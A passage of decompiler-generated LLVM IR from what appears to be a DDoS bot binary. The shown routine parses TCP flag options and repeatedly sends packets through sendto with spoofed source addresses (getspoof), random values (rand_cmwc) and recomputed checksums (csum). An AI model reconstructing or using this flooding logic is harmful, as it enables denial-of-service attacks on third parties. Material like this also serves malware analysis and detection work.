  store i1 false, i1* %cf.global-to-local, align 1
  %v5_805038241 = icmp eq i32 %v3_8050161, 0
  %v1_805038648 = icmp eq i1 %v5_805038241, false
  br i1 %v1_805038648, label %dec_label_pc_8050171.lr.ph, label %dec_label_pc_805038c

dec_label_pc_8050171.lr.ph:                       ; preds = %dec_label_pc_8050155
  %v1_8050364 = add i32 %v2_804ff85, 33
  %v2_8050364 = inttoptr i32 %v1_8050364 to i8*
  %tmp132 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_8050171

dec_label_pc_8050171:                             ; preds = %dec_label_pc_8050171.lr.ph, %dec_label_pc_805036d
  %v3_805031c = phi i8* [ %v5_8050169, %dec_label_pc_8050171.lr.ph ], [ %tmp133, %dec_label_pc_805036d ]
  %stack_var_-224.150 = phi i8* [ %tmp67, %dec_label_pc_8050171.lr.ph ], [ %stack_var_-224.0, %dec_label_pc_805036d ]
  %stack_var_-228.149 = phi i32 [ %tmp66, %dec_label_pc_8050171.lr.ph ], [ %stack_var_-228.0, %dec_label_pc_805036d ]
  %v4_8050171 = ptrtoint i8* %v3_805031c to i32
  store i32 %v4_8050171, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050171, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a00.199 to i32), i32* @edi, align 4
  %v6_80501a1 = call i32 @_strncmp(i8* %v3_805031c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a00.199, i32 0, i32 0), i32 4)
  %v7_80501a1 = urem i32 %v6_80501a1, 2
  %v8_80501a1 = icmp eq i32 %v7_80501a1, 0
  %v0_80501a3 = load i1, i1* %cf.global-to-local, align 1
  %v2_80501a3 = or i1 %v0_80501a3, %v8_80501a1
  %v3_80501a3 = zext i1 %v2_80501a3 to i32
  %v4_80501a3 = load i32, i32* @edx, align 4
  %v5_80501a3 = and i32 %v4_80501a3, -256
  %v6_80501a3 = or i32 %v3_80501a3, %v5_80501a3
  %v7_80501a3 = xor i32 %v6_80501a3, 1
  store i32 %v7_80501a3, i32* %edx.global-to-local, align 4
  %v3_80501a9 = and i32 %v6_80501a1, -256
  %v1_80501ab = trunc i32 %v7_80501a3 to i8
  %v3_80501ab = zext i1 %v0_80501a3 to i8
  %v4_80501ab = sub nsw i8 %v1_80501ab, %v3_80501ab
  %v15_80501ab = icmp eq i8 %v4_80501ab, 0
  %v20_80501ab = zext i8 %v4_80501ab to i32
  %v23_80501ab = or i32 %v20_80501ab, %v3_80501a9
  store i32 %v23_80501ab, i32* @ecx, align 4
  %v2_80501af = sext i8 %v4_80501ab to i32
  store i32 %v2_80501af, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80501b4 = icmp eq i1 %v15_80501ab, false
  br i1 %v1_80501b4, label %dec_label_pc_80501c7, label %dec_label_pc_80501b6

dec_label_pc_80501b6:                             ; preds = %dec_label_pc_8050171
  store i32 %v1_804ff9d, i32* @eax, align 4
  %v3_80501b9 = load i8, i8* %v2_8050364, align 1
  %v4_80501b9 = zext i8 %v3_80501b9 to i32
  %v7_80501b9 = or i32 %v5_80501a3, %v4_80501b9
  %v1_80501bc = or i32 %v7_80501b9, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_80501bc = trunc i32 %v1_80501bc to i8
  store i32 %v1_80501bc, i32* @edx, align 4
  store i8 %v3_80501bc, i8* %v2_8050364, align 1
  br label %dec_label_pc_805036d

dec_label_pc_80501c7:                             ; preds = %dec_label_pc_8050171
  store i32 %v4_8050171, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050171, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a04.200 to i32), i32* @edi, align 4
  %v6_80501f7 = call i32 @_strncmp(i8* %v3_805031c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a04.200, i32 0, i32 0), i32 4)
  %v7_80501f7 = urem i32 %v6_80501f7, 2
  %v8_80501f7 = icmp eq i32 %v7_80501f7, 0
  %v0_80501f9 = load i1, i1* %cf.global-to-local, align 1
  %v2_80501f9 = or i1 %v0_80501f9, %v8_80501f7
  %v3_80501f9 = zext i1 %v2_80501f9 to i32
  %v4_80501f9 = load i32, i32* %edx.global-to-local, align 4
  %v5_80501f9 = and i32 %v4_80501f9, -256
  %v6_80501f9 = or i32 %v3_80501f9, %v5_80501f9
  %v7_80501f9 = xor i32 %v6_80501f9, 1
  store i32 %v7_80501f9, i32* %edx.global-to-local, align 4
  %v3_80501ff = and i32 %v6_80501f7, -256
  %v1_8050201 = trunc i32 %v7_80501f9 to i8
  %v3_8050201 = zext i1 %v0_80501f9 to i8
  %v4_8050201 = sub nsw i8 %v1_8050201, %v3_8050201
  %v15_8050201 = icmp eq i8 %v4_8050201, 0
  %v20_8050201 = zext i8 %v4_8050201 to i32
  %v23_8050201 = or i32 %v20_8050201, %v3_80501ff
  store i32 %v23_8050201, i32* @ecx, align 4
  %v2_8050205 = sext i8 %v4_8050201 to i32
  store i32 %v2_8050205, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805020a = icmp eq i1 %v15_8050201, false
  br i1 %v1_805020a, label %dec_label_pc_805021d, label %dec_label_pc_805020c

dec_label_pc_805020c:                             ; preds = %dec_label_pc_80501c7
  store i32 %v1_804ff9d, i32* @eax, align 4
  %v3_805020f = load i8, i8* %v2_8050364, align 1
  %v4_805020f = zext i8 %v3_805020f to i32
  %v7_805020f = or i32 %v5_80501f9, %v4_805020f
  %v1_8050212 = or i32 %v7_805020f, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_8050212 = trunc i32 %v1_8050212 to i8
  store i32 %v1_8050212, i32* @edx, align 4
  store i8 %v3_8050212, i8* %v2_8050364, align 1
  br label %dec_label_pc_805036d

dec_label_pc_805021d:                             ; preds = %dec_label_pc_80501c7
  store i32 %v4_8050171, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050171, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a08.201 to i32), i32* @edi, align 4
  %v6_805024d = call i32 @_strncmp(i8* %v3_805031c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a08.201, i32 0, i32 0), i32 4)
  %v7_805024d = urem i32 %v6_805024d, 2
  %v8_805024d = icmp eq i32 %v7_805024d, 0
  %v0_805024f = load i1, i1* %cf.global-to-local, align 1
  %v2_805024f = or i1 %v0_805024f, %v8_805024d
  %v3_805024f = zext i1 %v2_805024f to i32
  %v4_805024f = load i32, i32* %edx.global-to-local, align 4
  %v5_805024f = and i32 %v4_805024f, -256
  %v6_805024f = or i32 %v3_805024f, %v5_805024f
  %v7_805024f = xor i32 %v6_805024f, 1
  store i32 %v7_805024f, i32* %edx.global-to-local, align 4
  %v3_8050255 = and i32 %v6_805024d, -256
  %v1_8050257 = trunc i32 %v7_805024f to i8
  %v3_8050257 = zext i1 %v0_805024f to i8
  %v4_8050257 = sub nsw i8 %v1_8050257, %v3_8050257
  %v15_8050257 = icmp eq i8 %v4_8050257, 0
  %v20_8050257 = zext i8 %v4_8050257 to i32
  %v23_8050257 = or i32 %v20_8050257, %v3_8050255
  store i32 %v23_8050257, i32* @ecx, align 4
  %v2_805025b = sext i8 %v4_8050257 to i32
  store i32 %v2_805025b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050260 = icmp eq i1 %v15_8050257, false
  br i1 %v1_8050260, label %dec_label_pc_8050273, label %dec_label_pc_8050262

dec_label_pc_8050262:                             ; preds = %dec_label_pc_805021d
  store i32 %v1_804ff9d, i32* @eax, align 4
  %v3_8050265 = load i8, i8* %v2_8050364, align 1
  %v4_8050265 = zext i8 %v3_8050265 to i32
  %v7_8050265 = or i32 %v5_805024f, %v4_8050265
  %v1_8050268 = or i32 %v7_8050265, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_8050268 = trunc i32 %v1_8050268 to i8
  store i32 %v1_8050268, i32* @edx, align 4
  store i8 %v3_8050268, i8* %v2_8050364, align 1
  br label %dec_label_pc_805036d

dec_label_pc_8050273:                             ; preds = %dec_label_pc_805021d
  store i32 %v4_8050171, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050171, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a0c.202 to i32), i32* @edi, align 4
  %v6_80502a3 = call i32 @_strncmp(i8* %v3_805031c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a0c.202, i32 0, i32 0), i32 4)
  %v7_80502a3 = urem i32 %v6_80502a3, 2
  %v8_80502a3 = icmp eq i32 %v7_80502a3, 0
  %v0_80502a5 = load i1, i1* %cf.global-to-local, align 1
  %v2_80502a5 = or i1 %v0_80502a5, %v8_80502a3
  %v3_80502a5 = zext i1 %v2_80502a5 to i32
  %v4_80502a5 = load i32, i32* %edx.global-to-local, align 4
  %v5_80502a5 = and i32 %v4_80502a5, -256
  %v6_80502a5 = or i32 %v3_80502a5, %v5_80502a5
  %v7_80502a5 = xor i32 %v6_80502a5, 1
  store i32 %v7_80502a5, i32* %edx.global-to-local, align 4
  %v3_80502ab = and i32 %v6_80502a3, -256
  %v1_80502ad = trunc i32 %v7_80502a5 to i8
  %v3_80502ad = zext i1 %v0_80502a5 to i8
  %v4_80502ad = sub nsw i8 %v1_80502ad, %v3_80502ad
  %v15_80502ad = icmp eq i8 %v4_80502ad, 0
  %v20_80502ad = zext i8 %v4_80502ad to i32
  %v23_80502ad = or i32 %v20_80502ad, %v3_80502ab
  store i32 %v23_80502ad, i32* @ecx, align 4
  %v2_80502b1 = sext i8 %v4_80502ad to i32
  store i32 %v2_80502b1, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80502b6 = icmp eq i1 %v15_80502ad, false
  br i1 %v1_80502b6, label %dec_label_pc_80502c9, label %dec_label_pc_80502b8

dec_label_pc_80502b8:                             ; preds = %dec_label_pc_8050273
  store i32 %v1_804ff9d, i32* @eax, align 4
  %v3_80502bb = load i8, i8* %v2_8050364, align 1
  %v4_80502bb = zext i8 %v3_80502bb to i32
  %v7_80502bb = or i32 %v5_80502a5, %v4_80502bb
  %v1_80502be = or i32 %v7_80502bb, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_80502be = trunc i32 %v1_80502be to i8
  store i32 %v1_80502be, i32* @edx, align 4
  store i8 %v3_80502be, i8* %v2_8050364, align 1
  br label %dec_label_pc_805036d

dec_label_pc_80502c9:                             ; preds = %dec_label_pc_8050273
  store i32 %v4_8050171, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050171, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a10.203 to i32), i32* @edi, align 4
  %v6_80502f9 = call i32 @_strncmp(i8* %v3_805031c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a10.203, i32 0, i32 0), i32 4)
  %v7_80502f9 = urem i32 %v6_80502f9, 2
  %v8_80502f9 = icmp eq i32 %v7_80502f9, 0
  %v0_80502fb = load i1, i1* %cf.global-to-local, align 1
  %v2_80502fb = or i1 %v0_80502fb, %v8_80502f9
  %v3_80502fb = zext i1 %v2_80502fb to i32
  %v4_80502fb = load i32, i32* %edx.global-to-local, align 4
  %v5_80502fb = and i32 %v4_80502fb, -256
  %v6_80502fb = or i32 %v3_80502fb, %v5_80502fb
  %v7_80502fb = xor i32 %v6_80502fb, 1
  store i32 %v7_80502fb, i32* %edx.global-to-local, align 4
  %v3_8050301 = and i32 %v6_80502f9, -256
  %v1_8050303 = trunc i32 %v7_80502fb to i8
  %v3_8050303 = zext i1 %v0_80502fb to i8
  %v4_8050303 = sub nsw i8 %v1_8050303, %v3_8050303
  %v15_8050303 = icmp eq i8 %v4_8050303, 0
  %v20_8050303 = zext i8 %v4_8050303 to i32
  %v23_8050303 = or i32 %v20_8050303, %v3_8050301
  store i32 %v23_8050303, i32* @ecx, align 4
  %v2_8050307 = sext i8 %v4_8050303 to i32
  store i32 %v2_8050307, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805030c = icmp eq i1 %v15_8050303, false
  br i1 %v1_805030c, label %dec_label_pc_805031c, label %dec_label_pc_805030e

dec_label_pc_805030e:                             ; preds = %dec_label_pc_80502c9
  store i32 %v1_804ff9d, i32* @eax, align 4
  %v3_8050311 = load i8, i8* %v2_8050364, align 1
  %v4_8050311 = zext i8 %v3_8050311 to i32
  %v7_8050311 = or i32 %v5_80502fb, %v4_8050311
  %v1_8050314 = or i32 %v7_8050311, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_8050314 = trunc i32 %v1_8050314 to i8
  store i32 %v1_8050314, i32* @edx, align 4
  store i8 %v3_8050314, i8* %v2_8050364, align 1
  br label %dec_label_pc_805036d

dec_label_pc_805031c:                             ; preds = %dec_label_pc_80502c9
  store i32 %v4_8050171, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050171, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a14.204 to i32), i32* @edi, align 4
  %v6_805034c = call i32 @_strncmp(i8* %v3_805031c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a14.204, i32 0, i32 0), i32 4)
  %v7_805034c = urem i32 %v6_805034c, 2
  %v8_805034c = icmp eq i32 %v7_805034c, 0
  %v0_805034e = load i1, i1* %cf.global-to-local, align 1
  %v2_805034e = or i1 %v0_805034e, %v8_805034c
  %v3_805034e = zext i1 %v2_805034e to i32
  %v4_805034e = load i32, i32* %edx.global-to-local, align 4
  %v5_805034e = and i32 %v4_805034e, -256
  %v6_805034e = or i32 %v3_805034e, %v5_805034e
  %v7_805034e = xor i32 %v6_805034e, 1
  store i32 %v7_805034e, i32* @edx, align 4
  %v3_8050354 = and i32 %v6_805034c, -256
  %v1_8050356 = trunc i32 %v7_805034e to i8
  %v3_8050356 = zext i1 %v0_805034e to i8
  %v4_8050356 = sub nsw i8 %v1_8050356, %v3_8050356
  %v15_8050356 = icmp eq i8 %v4_8050356, 0
  %v20_8050356 = zext i8 %v4_8050356 to i32
  %v23_8050356 = or i32 %v20_8050356, %v3_8050354
  store i32 %v23_8050356, i32* @ecx, align 4
  %v2_805035a = sext i8 %v4_8050356 to i32
  store i32 %v2_805035a, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805035f = icmp eq i1 %v15_8050356, false
  br i1 %v1_805035f, label %dec_label_pc_805036d, label %dec_label_pc_8050361

dec_label_pc_8050361:                             ; preds = %dec_label_pc_805031c
  store i32 %v1_804ff9d, i32* @eax, align 4
  %v3_8050364 = load i8, i8* %v2_8050364, align 1
  %v4_8050364 = zext i8 %v3_8050364 to i32
  %v7_8050364 = or i32 %v5_805034e, %v4_8050364
  %v1_8050367 = or i32 %v7_8050364, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_8050367 = trunc i32 %v1_8050367 to i8
  store i32 %v1_8050367, i32* @edx, align 4
  store i8 %v3_8050367, i8* %v2_8050364, align 1
  br label %dec_label_pc_805036d

dec_label_pc_805036d:                             ; preds = %dec_label_pc_805031c, %dec_label_pc_805030e, %dec_label_pc_80502b8, %dec_label_pc_8050262, %dec_label_pc_805020c, %dec_label_pc_80501b6, %dec_label_pc_8050361
  %stack_var_-228.0 = phi i32 [ 4, %dec_label_pc_805031c ], [ 4, %dec_label_pc_8050361 ], [ %stack_var_-228.149, %dec_label_pc_805030e ], [ %stack_var_-228.149, %dec_label_pc_80502b8 ], [ %stack_var_-228.149, %dec_label_pc_8050262 ], [ %stack_var_-228.149, %dec_label_pc_805020c ], [ %stack_var_-228.149, %dec_label_pc_80501b6 ]
  %stack_var_-224.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a14.204, i32 0, i32 0), %dec_label_pc_805031c ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a14.204, i32 0, i32 0), %dec_label_pc_8050361 ], [ %stack_var_-224.150, %dec_label_pc_805030e ], [ %stack_var_-224.150, %dec_label_pc_80502b8 ], [ %stack_var_-224.150, %dec_label_pc_8050262 ], [ %stack_var_-224.150, %dec_label_pc_805020c ], [ %stack_var_-224.150, %dec_label_pc_80501b6 ]
  %v0_805036d = load i32, i32* @esp, align 4
  %v5_805036d = icmp ult i32 %v0_805036d, 8
  store i1 %v5_805036d, i1* %cf.global-to-local, align 1
  %v1_8050370 = add i32 %v0_805036d, -12
  %v2_8050370 = inttoptr i32 %v1_8050370 to i32*
  store i32 ptrtoint (i32* @global_var_80699fe.198 to i32), i32* %v2_8050370, align 4
  %v1_8050375 = add i32 %v0_805036d, -16
  %v2_8050375 = inttoptr i32 %v1_8050375 to i32*
  store i32 0, i32* %v2_8050375, align 4
  %v2_8050377 = ptrtoint i8* %stack_var_-224.0 to i32
  %v3_8050377 = call i32 @__GI_strtok(i32 %stack_var_-228.0, i32 %v2_8050377)
  store i32 %v3_8050377, i32* %eax.global-to-local, align 4
  store i32 %v3_8050377, i32* %tmp132, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8050382 = icmp eq i32 %v3_8050377, 0
  %v1_8050386 = icmp eq i1 %v5_8050382, false
  %tmp133 = inttoptr i32 %v3_8050377 to i8*
  br i1 %v1_8050386, label %dec_label_pc_8050171, label %dec_label_pc_805038c

dec_label_pc_805038c:                             ; preds = %dec_label_pc_805036d, %dec_label_pc_8050155, %dec_label_pc_8050138, %dec_label_pc_80500ca, %dec_label_pc_8050038
  %v1_805038f = add i32 %v2_804ff85, 34
  %v2_805038f = inttoptr i32 %v1_805038f to i16*
  store i16 2048, i16* %v2_805038f, align 2
  %v1_8050398 = add i32 %v2_804ff85, 36
  %v2_8050398 = inttoptr i32 %v1_8050398 to i16*
  store i16 0, i16* %v2_8050398, align 4
  store i32 %v1_804ff9d, i32* %eax.global-to-local, align 4
  %v1_80503a1 = add i32 %v2_804ff85, 38
  %v2_80503a1 = inttoptr i32 %v1_80503a1 to i16*
  store i16 0, i16* %v2_80503a1, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804fe9d, label %dec_label_pc_80503b8, label %dec_label_pc_80503ad

dec_label_pc_80503ad:                             ; preds = %dec_label_pc_805038c
  %v0_80503ad = load i8*, i8** %stack_var_-20, align 4
  %v1_80503ad = ptrtoint i8* %v0_80503ad to i32
  %v2_80503ad = call i32 @rand_cmwc(i32 %v1_80503ad)
  store i32 %v2_80503ad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503d0

dec_label_pc_80503b8:                             ; preds = %dec_label_pc_805038c
  %v1_80503bb = urem i32 %v3_804fe5a, 65536
  store i32 %v1_80503bb, i32* %eax.global-to-local, align 4
  %v0_80503c0 = load i32, i32* @esp, align 4
  %v5_80503c0 = icmp ult i32 %v0_80503c0, 12
  store i1 %v5_80503c0, i1* %cf.global-to-local, align 1
  %v2_80503c3 = add i32 %v0_80503c0, -16
  %v3_80503c3 = inttoptr i32 %v2_80503c3 to i32*
  store i32 %v1_80503bb, i32* %v3_80503c3, align 4
  %v1_80503c4 = sext i16 %tmp65 to i32
  %v2_80503c4 = call i32 @htons(i32 %v1_80503c4)
  store i32 %v2_80503c4, i32* %eax.global-to-local, align 4
  %v0_80503c9 = load i32, i32* @esp, align 4
  %v2_80503c9 = icmp ugt i32 %v0_80503c9, -17
  store i1 %v2_80503c9, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80503d0

dec_label_pc_80503d0:                             ; preds = %dec_label_pc_80503ad, %dec_label_pc_80503b8
  %storemerge.in = phi i32 [ %v2_80503c4, %dec_label_pc_80503b8 ], [ %v2_80503ad, %dec_label_pc_80503ad ]
  %storemerge = trunc i32 %storemerge.in to i16
  %v4_80503d3 = urem i32 %storemerge.in, 65536
  %v5_80503d3 = load i32, i32* @esi, align 4
  %v6_80503d3 = and i32 %v5_80503d3, -65536
  %v7_80503d3 = or i32 %v6_80503d3, %v4_80503d3
  store i32 %v7_80503d3, i32* @esi, align 4
  %v3_80503d7 = add i32 %v2_804ff85, 22
  %v4_80503d7 = inttoptr i32 %v3_80503d7 to i16*
  store i16 %storemerge, i16* %v4_80503d7, align 2
  store i32 %v1_804ff9d, i32* %eax.global-to-local, align 4
  store i32 %v2_804ff85, i32* %edx.global-to-local, align 4
  %v1_80503e1 = load i32, i32* @esp, align 4
  %v2_80503e1 = add i32 %v1_80503e1, -4
  %v3_80503e1 = inttoptr i32 %v2_80503e1 to i32*
  store i32 %v1_804ff9d, i32* %v3_80503e1, align 4
  %v0_80503e2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80503e2 = add i32 %v1_80503e1, -8
  %v3_80503e2 = inttoptr i32 %v2_80503e2 to i32*
  store i32 %v0_80503e2, i32* %v3_80503e2, align 4
  %sext32 = mul i32 %storemerge.in, 65536
  %v1_80503e3 = sdiv i32 %sext32, 65536
  %v3_80503e3 = inttoptr i32 %v1_80503e3 to i16*
  %v4_80503e3 = call i32 @csum(i16* %v3_80503e3, i32 ptrtoint (i32* @0 to i32))
  %v5_80503e3 = trunc i32 %v4_80503e3 to i16
  %sext33 = mul i32 %v4_80503e3, 65536
  %v1_80503eb = sdiv i32 %sext33, 65536
  store i32 %v1_80503eb, i32* %edx.global-to-local, align 4
  store i16 %v5_80503e3, i16* %v2_8050398, align 4
  store i32 %v2_804ff85, i32* %eax.global-to-local, align 4
  %v1_80503f7 = or i32 %v2_804ff85, 2
  %v2_80503f7 = inttoptr i32 %v1_80503f7 to i16*
  %v3_80503f7 = load i16, i16* %v2_80503f7, align 2
  %v4_80503f7 = zext i16 %v3_80503f7 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_80503f7, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff85, i32* %eax.global-to-local, align 4
  %v1_8050406 = load i32, i32* @esp, align 4
  %v2_8050406 = add i32 %v1_8050406, -4
  %v3_8050406 = inttoptr i32 %v2_8050406 to i32*
  store i32 %v4_80503f7, i32* %v3_8050406, align 4
  %v0_8050407 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050407 = add i32 %v1_8050406, -8
  %v3_8050407 = inttoptr i32 %v2_8050407 to i32*
  store i32 %v0_8050407, i32* %v3_8050407, align 4
  %v4_8050408 = call i32 @csum(i16* %v3_80503e3, i32 ptrtoint (i32* @0 to i32))
  %v5_8050408 = trunc i32 %v4_8050408 to i16
  %sext35 = mul i32 %v4_8050408, 65536
  %v1_8050410 = sdiv i32 %sext35, 65536
  store i32 %v1_8050410, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff85, i32* %eax.global-to-local, align 4
  %v3_8050415 = or i32 %v2_804ff85, 10
  %v4_8050415 = inttoptr i32 %v3_8050415 to i16*
  store i16 %v5_8050408, i16* %v4_8050415, align 2
  %v0_8050419 = load i32, i32* @esp, align 4
  %v5_8050419 = icmp ult i32 %v0_8050419, 12
  store i1 %v5_8050419, i1* %cf.global-to-local, align 1
  %v1_805041c = add i32 %v0_8050419, -16
  %v2_805041c = inttoptr i32 %v1_805041c to i32*
  store i32 0, i32* %v2_805041c, align 4
  %v2_805041e = inttoptr i32 %v1_80503e3 to i32*
  %v3_805041e = call i32 @__GI_time(i32* %v2_805041e)
  %v0_8050423 = load i32, i32* @esp, align 4
  %v1_8050423 = add i32 %v0_8050423, 16
  %v5_8050426 = add i32 %v3_805041e, %v3_804fe63
  %v10_8050426 = icmp ult i32 %v5_8050426, %v3_805041e
  store i1 %v10_8050426, i1* %cf.global-to-local, align 1
  store i32 %v5_8050426, i32* %eax.global-to-local, align 4
  %v2_805045c = or i32 %v2_804ff85, 12
  %v3_805045c = inttoptr i32 %v2_805045c to i32*
  %v3_8050469 = or i32 %v2_804ff85, 4
  %v4_8050469 = inttoptr i32 %v3_8050469 to i16*
  br label %dec_label_pc_8050435

dec_label_pc_8050435:                             ; preds = %dec_label_pc_80504d6, %dec_label_pc_80504f4, %dec_label_pc_80503d0
  %v0_805043b = phi i32 [ %v1_8050423, %dec_label_pc_80503d0 ], [ %v0_805043b.pre.pre, %dec_label_pc_80504f4 ], [ %v1_80504e0, %dec_label_pc_80504d6 ]
  %stack_var_-100.0 = phi i32 [ 0, %dec_label_pc_80503d0 ], [ %v4_80504f4, %dec_label_pc_80504f4 ], [ 0, %dec_label_pc_80504d6 ]
  store i32 %v2_804fec5, i32* %eax.global-to-local, align 4
  store i32 %v2_804ff85, i32* %edx.global-to-local, align 4
  %v5_805043b = icmp ult i32 %v0_805043b, 8
  store i1 %v5_805043b, i1* %cf.global-to-local, align 1
  %v1_805043e = add i32 %v0_805043b, -12
  %v2_805043e = inttoptr i32 %v1_805043e to i32*
  store i32 16, i32* %v2_805043e, align 4
  %v2_8050440 = add i32 %v0_805043b, -16
  %v3_8050440 = inttoptr i32 %v2_8050440 to i32*
  store i32 %v2_804fec5, i32* %v3_8050440, align 4
  %v1_8050441 = add i32 %v0_805043b, -20
  %v2_8050441 = inttoptr i32 %v1_8050441 to i32*
  store i32 0, i32* %v2_8050441, align 4
  %v5_8050443 = add i32 %v0_805043b, -24
  %v6_8050443 = inttoptr i32 %v5_8050443 to i32*
  store i32 %v1_804ff65, i32* %v6_8050443, align 4
  %v0_8050446 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050446 = add i32 %v0_805043b, -28
  %v3_8050446 = inttoptr i32 %v2_8050446 to i32*
  store i32 %v0_8050446, i32* %v3_8050446, align 4
  %v5_8050447 = add i32 %v0_805043b, -32
  %v6_8050447 = inttoptr i32 %v5_8050447 to i32*
  store i32 %v3_804feff, i32* %v6_8050447, align 4
  %v1_805044a = load i32, i32* %stack_var_-96, align 4
  %v2_805044a = load i32, i32* %stack_var_-92, align 4
  %v3_805044a = load i32, i32* %stack_var_-88, align 4
  %v4_805044a = load i32, i32* %stack_var_-84, align 4
  %v6_805044a = call i32 @sendto(i32 %stack_var_-100.0, i32 %v1_805044a, i32 %v2_805044a, i32 %v3_805044a, i32 %v4_805044a, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805044a, i32* %eax.global-to-local, align 4
  %v0_805044f = load i32, i32* @esp, align 4
  %v2_805044f = icmp ugt i32 %v0_805044f, -33
  store i1 %v2_805044f, i1* %cf.global-to-local, align 1
  %v1_8050452 = call i32 @getspoof(i32 %stack_var_-100.0)
  store i32 %v1_8050452, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff85, i32* %eax.global-to-local, align 4
  store i32 %v1_8050452, i32* %v3_805045c, align 4
  %v1_805045f = call i32 @rand_cmwc(i32 %stack_var_-100.0)
  %sext29 = mul i32 %v1_805045f, 65536
  %v1_8050464 = sdiv i32 %sext29, 65536
  store i32 %v1_8050464, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff85, i32* %eax.global-to-local, align 4
  %v1_8050469 = trunc i32 %v1_8050464 to i16
  store i16 %v1_8050469, i16* %v4_8050469, align 4
  %v1_805046d = call i32 @rand_cmwc(i32 %stack_var_-100.0)
  store i32 %v1_805046d, i32* %edx.global-to-local, align 4
  store i32 %v1_804ff9d, i32* %eax.global-to-local, align 4
  store i32 %v1_805046d, i32* %v3_804ffe9, align 8
  %v1_805047a = call i32 @rand_cmwc(i32 %stack_var_-100.0)
  %v1_8050484 = trunc i32 %v1_805047a to i16
  store i16 %v1_8050484, i16* %v5_804ffa0, align 4
  store i16 0, i16* %v2_8050398, align 4
  store i32 %v1_804ff9d, i32* %eax.global-to-local, align 4
  store i32 %v2_804ff85, i32* %edx.global-to-local, align 4
  %v1_8050496 = load i32, i32* @esp, align 4
  %v2_8050496 = add i32 %v1_8050496, -4
  %v3_8050496 = inttoptr i32 %v2_8050496 to i32*
  store i32 %v1_804ff9d, i32* %v3_8050496, align 4
  %v0_8050497 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050497 = add i32 %v1_8050496, -8
  %v3_8050497 = inttoptr i32 %v2_8050497 to i32*
  store i32 %v0_8050497, i32* %v3_8050497, align 4
  %v1_8050498 = load i32, i32* %stack_var_-96, align 4
  %v2_8050498 = inttoptr i32 %stack_var_-100.0 to i16*
  %v3_8050498 = call i32 @csum(i16* %v2_8050498, i32 %v1_8050498)
  %v4_8050498 = trunc i32 %v3_8050498 to i16
  %sext37 = mul i32 %v3_8050498, 65536
  %v1_80504a0 = sdiv i32 %sext37, 65536
  store i32 %v1_80504a0, i32* %edx.global-to-local, align 4
  store i16 %v4_8050498, i16* %v2_8050398, align 4
  store i32 %v2_804ff85, i32* %eax.global-to-local, align 4
  %v3_80504ac = load i16, i16* %v2_80503f7, align 2
  %v4_80504ac = zext i16 %v3_80504ac to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_80504ac, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff85, i32* %eax.global-to-local, align 4
  %v1_80504bb = load i32, i32* @esp, align 4
  %v2_80504bb = add i32 %v1_80504bb, -4
  %v3_80504bb = inttoptr i32 %v2_80504bb to i32*
  store i32 %v4_80504ac, i32* %v3_80504bb, align 4
  %v0_80504bc = load i32, i32* %eax.global-to-local, align 4
  %v2_80504bc = add i32 %v1_80504bb, -8
  %v3_80504bc = inttoptr i32 %v2_80504bc to i32*
  store i32 %v0_80504bc, i32* %v3_80504bc, align 4
  %v1_80504bd = load i32, i32* %stack_var_-96, align 4
  %v3_80504bd = call i32 @csum(i16* %v2_8050498, i32 %v1_80504bd)
  %v4_80504bd = trunc i32 %v3_80504bd to i16
